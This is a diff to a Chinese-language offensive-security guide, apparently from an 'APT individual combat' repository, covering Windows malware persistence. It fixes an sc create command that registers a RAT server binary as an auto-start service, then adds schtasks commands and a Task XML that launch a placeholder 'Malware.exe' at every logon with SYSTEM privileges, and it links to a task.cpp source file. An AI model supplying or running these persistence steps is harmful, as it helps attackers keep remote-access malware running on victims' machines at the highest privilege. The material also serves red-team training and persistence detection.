@@ -850,10 +850,42 @@ x86_64-w64-mingw32-g++ -O2 windows_server.cpp -o windows_server.exe -I /usr/shar
 ```
 
 ```Bash
-sc create GhostWolfLab binpath= "C:\Users\snowwolf\Desktop\rat\pre\windows_server.exe start= auto
+sc create GhostWolfLab binpath= "C:\Users\snowwolf\Desktop\rat\pre\windows_server.exe" start= auto
 sc query GhostWolfLab
 sc start GhostWolfLab
 sc config ExistingService binPath= "C:\Path\To\Malware.exe"
 sc stop 服务名称
 sc delete 服务名称
 ```
+
+### 计划任务持久化
+
+1、使用schtasks命令创建计划任务
+
+```Bash
+schtasks /create /tn "Snowwolf" /tr "C:\Path\To\Malware.exe" /sc onlogon /ru SYSTEM
+```
+
+2、使用XML配置创建计划任务
+
+```xml
+<!-- Task.xml -->
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Actions>
+    <Exec>
+      <Command>C:\Path\To\Malware.exe</Command>
+    </Exec>
+  </Actions>
+</Task>
+```
+
+```Bash
+schtasks /create /tn "MaliciousTask" /xml "C:\Path\To\Task.xml" /ru SYSTEM
+```
+
+[task.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/task.cpp)
